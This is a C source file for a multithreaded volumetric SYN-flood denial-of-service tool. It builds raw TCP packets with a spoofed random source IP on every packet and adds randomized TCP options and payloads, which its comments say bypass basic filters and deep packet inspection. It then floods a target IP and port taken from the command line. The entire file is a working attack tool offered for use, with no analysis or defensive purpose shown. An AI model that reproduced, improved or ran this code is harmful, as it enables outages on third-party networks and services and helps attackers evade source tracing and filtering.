#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// Structure for the pseudo-header (required for TCP checksum)
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

typedef struct {
    char target_ip[16];
    int port;
    int duration;
} AttackArgs;

// Standard Checksum Function for Raw Headers
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void *flood(void *args) {
    AttackArgs *a = (AttackArgs *)args;
    // SOCK_RAW allows us to bypass the kernel networking stack
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error: Must run as root for raw sockets");
        exit(1);
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->port);
    sin.sin_addr.s_addr = inet_addr(a->target_ip);

    // Modern TCP Options (20 bytes) + Volumetric Payload (1024 bytes)
    int options_len = 20;
    int payload_size = 1024; 

    while(1) {
        memset(datagram, 0, 4096);

        // --- IP Header (Randomized Source IP) ---
        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + options_len + payload_size;
        iph->id = htons(rand() % 65535);
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = rand(); // THE 5/5 POWER: SPOOFS EVERY PACKET
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *) datagram, sizeof(struct iphdr));

        // --- TCP Header (Randomized Seq/Source Port) ---
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(a->port);
        tcph->seq = htonl(rand());
        tcph->doff = (sizeof(struct tcphdr) + options_len) / 4;
        tcph->syn = 1;
        tcph->window = htons(65535); // Max window for resource exhaustion

        // --- Modern TCP Options (Bypasses basic filters) ---
        unsigned char *opt = (unsigned char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
        opt[0] = 2; opt[1] = 4; *((uint16_t*)(opt + 2)) = htons(1460); // MSS
        opt[4] = 4; opt[5] = 2; // SACK OK
        opt[6] = 8; opt[7] = 10; *((uint32_t*)(opt + 8)) = htonl(rand()); // Timestamp
        opt[17] = 3; opt[18] = 3; opt[19] = 6; // Window Scale

        // --- Randomized Payload (Bypasses DPI) ---
        unsigned char *payload = (unsigned char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + options_len);
        for(int i = 0; i < payload_size; i++) payload[i] = rand() % 256;

        // --- Checksum Calculation ---
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + options_len + payload_size);

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + options_len + payload_size;
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + options_len + payload_size);
        tcph->check = checksum((unsigned short*) pseudogram, psize);
        free(pseudogram);

        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: sudo %s <IP> <Port> <Time> <Threads>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    AttackArgs args;
    strncpy(args.target_ip, argv[1], 16);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t tid[threads];
    printf("--- APEX 5/5 VOLUMETRIC SYN FLOOD STARTING ---\n");

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood, &args);
    }

    sleep(args.duration);
    printf("--- SESSION COMPLETE ---\n");
    return 0;
}